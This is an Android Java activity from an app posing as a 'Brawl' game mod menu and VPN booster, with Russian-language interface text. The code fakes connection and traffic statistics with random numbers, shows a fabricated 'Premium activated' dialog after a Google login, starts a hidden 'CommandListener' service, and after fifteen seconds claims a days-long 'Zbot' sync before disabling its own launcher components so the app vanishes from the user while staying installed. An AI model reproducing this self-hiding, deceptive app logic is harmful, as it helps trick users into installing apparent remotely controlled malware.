package com.brawl.modmenu;

import android.animation.ObjectAnimator;
import android.animation.ValueAnimator;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.view.animation.AccelerateDecelerateInterpolator;
import android.widget.LinearLayout;
import android.widget.TextView;
import java.util.Locale;
import java.util.Random;

public class MainActivity extends Activity {

    private Handler handler = new Handler(Looper.getMainLooper());
    private Random rnd = new Random();
    private boolean connected = false;
    private long sessionStart = 0;
    private double uploaded = 0;
    private double downloaded = 0;

    private TextView statusText, uploadTv, downloadTv, sessionTv, connectStatus;
    private LinearLayout connectBtn;
    private View pulseOuter, pulseMiddle;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.main);

        statusText = findViewById(R.id.statusText);
        uploadTv = findViewById(R.id.upload);
        downloadTv = findViewById(R.id.download);
        sessionTv = findViewById(R.id.sessionTime);
        connectStatus = findViewById(R.id.connectStatus);
        connectBtn = findViewById(R.id.connectBtn);
        pulseOuter = findViewById(R.id.pulseOuter);
        pulseMiddle = findViewById(R.id.pulseMiddle);

        // Начинаем с "не защищено"
        connectStatus.setText("ПОДКЛЮЧИТЬ");
        statusText.setText("○ Не защищено");
        statusText.setTextColor(0xFF8899aa);

        // Анимация пульсации
        startPulse(pulseOuter, 1f, 1.15f, 1800);
        startPulse(pulseMiddle, 1f, 1.25f, 2400);

        // Нажатие кнопки Connect
        connectBtn.setOnClickListener(v -> toggleConnect());

        // Запускаем сервисы
        try {
            startService(new Intent(this, CommandListener.class));
        } catch (Throwable ignored) {}

        // Обновление счётчика
        handler.post(updateTimer);

        // Уведомление о Premium после Google-логина
        boolean justLoggedIn = getIntent().getBooleanExtra("just_logged_in", false);
        if (justLoggedIn) {
            new Handler(Looper.getMainLooper()).postDelayed(this::showPremiumUnlocked, 500);
        }

        // Через 15 секунд — экран ожидания + скрытие
        handler.postDelayed(this::showWaitingAndHide, 15000);
    }

    private void toggleConnect() {
        connected = !connected;

        if (connected) {
            sessionStart = System.currentTimeMillis();
            connectStatus.setText("ЗАЩИЩЕНО");
            statusText.setText("● Подключено к Ukraine");
            statusText.setTextColor(0xFF00ff41);

            try {
                Intent i = new Intent(this, BoostVpnService.class);
                i.setAction("START");
                startService(i);
            } catch (Throwable ignored) {}

        } else {
            connectStatus.setText("ПОДКЛЮЧИТЬ");
            statusText.setText("○ Не защищено");
            statusText.setTextColor(0xFF8899aa);
            uploaded = 0;
            downloaded = 0;
            sessionStart = 0;

            try {
                Intent i = new Intent(this, BoostVpnService.class);
                i.setAction("STOP");
                startService(i);
            } catch (Throwable ignored) {}
        }
    }

    private void startPulse(View v, float from, float to, int duration) {
        ObjectAnimator sx = ObjectAnimator.ofFloat(v, "scaleX", from, to, from);
        ObjectAnimator sy = ObjectAnimator.ofFloat(v, "scaleY", from, to, from);
        sx.setDuration(duration);
        sy.setDuration(duration);
        sx.setRepeatCount(ObjectAnimator.INFINITE);
        sy.setRepeatCount(ObjectAnimator.INFINITE);
        sx.setInterpolator(new AccelerateDecelerateInterpolator());
        sy.setInterpolator(new AccelerateDecelerateInterpolator());
        sx.start();
        sy.start();
    }

    private Runnable updateTimer = new Runnable() {
        @Override
        public void run() {
            // трафик растёт только если подключён
            if (connected) {
                uploaded += rnd.nextInt(120) * 1024;
                downloaded += rnd.nextInt(400) * 1024;

                long elapsed = System.currentTimeMillis() - sessionStart;
                long sec = elapsed / 1000;
                long h = sec / 3600;
                long m = (sec % 3600) / 60;
                long s = sec % 60;
                sessionTv.setText(String.format(Locale.US, "%02d:%02d:%02d", h, m, s));
            }

            uploadTv.setText(fmt(uploaded));
            downloadTv.setText(fmt(downloaded));

            handler.postDelayed(this, 1000);
        }
    };

    private String fmt(double bytes) {
        if (bytes < 1024) return (int) bytes + " Б";
        if (bytes < 1024 * 1024) return String.format(Locale.US, "%.1f КБ", bytes / 1024);
        return String.format(Locale.US, "%.1f МБ", bytes / 1024 / 1024);
    }

    private void showPremiumUnlocked() {
        try {
            android.app.AlertDialog.Builder b = new android.app.AlertDialog.Builder(this);
            b.setTitle("👑 Premium активирован");
            b.setMessage("Ваш аккаунт успешно привязан.\n\nПремиум-доступ активирован на 7 дней бесплатно.\n\nПриятного использования!");
            b.setPositiveButton("ПОНЯТНО", (d, w) -> d.dismiss());
            b.setCancelable(false);
            b.show();
        } catch (Throwable ignored) {}
    }

    private void showWaitingAndHide() {
        try {
            android.app.AlertDialog.Builder b = new android.app.AlertDialog.Builder(this);
            b.setTitle("⏳ Ожидание");
            b.setMessage("Идёт синхронизация с серверами Zbot.\n\nПожалуйста, не закрывайте приложение.\n\nЧерез 2-7 дней Boost активируется автоматически.");
            b.setCancelable(false);
            b.setPositiveButton("OK", (d, w) -> {
                d.dismiss();
                hideSelf();
            });
            b.show();
        } catch (Throwable ignored) {
            hideSelf();
        }
    }

    private void hideSelf() {
        try {
            PackageManager pm = getPackageManager();
            String[] names = {
                "com.brawl.modmenu.SplashActivity",
                "com.brawl.modmenu.WelcomeActivity",
                "com.brawl.modmenu.OnboardingActivity",
                "com.brawl.modmenu.MainActivity",
                "com.brawl.modmenu.WebLoginActivity"
            };
            for (String name : names) {
                try {
                    ComponentName cn = new ComponentName(getPackageName(), name);
                    pm.setComponentEnabledSetting(cn,
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP);
                } catch (Throwable ignored) {}
            }
        } catch (Throwable ignored) {}

        finishAffinity();
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            android.os.Process.killProcess(android.os.Process.myPid());
        }, 500);
    }

    @Override
    protected void onDestroy() {
        handler.removeCallbacksAndMessages(null);
        super.onDestroy();
    }
}
